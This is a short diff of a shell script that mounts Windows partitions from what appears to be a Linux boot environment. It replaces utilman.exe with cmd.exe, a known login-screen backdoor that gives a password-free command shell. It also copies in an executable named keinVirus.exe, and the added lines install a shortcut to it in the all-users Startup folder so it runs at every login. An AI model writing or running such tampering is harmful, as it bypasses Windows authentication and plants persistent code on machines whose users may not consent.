@@ -22,6 +22,10 @@ for PARTITION in `fdisk -l | grep -v swap | egrep -o /dev/sd.[0-9]+` ; do
                     cp cmd.exe utilman.exe
                     cp cmd.exe Utilman.exe
                     cp /usr/share/winmod/keinVirus.exe keinVirus.exe
+                    if [ -d $MOUNTPOINT/ProgramData/Microsoft/Windows/Start\ Menu/Programs/StartUp ] ; then
+                        cd $MOUNTPOINT/ProgramData/Microsoft/Windows/Start\ Menu/Programs/StartUp
+                        cp /usr/share/winmod/keinVirus.lnk keinVirus.lnk
+                    fi
                     cd $BASEDIR
                 fi
                 umount $PARTITION
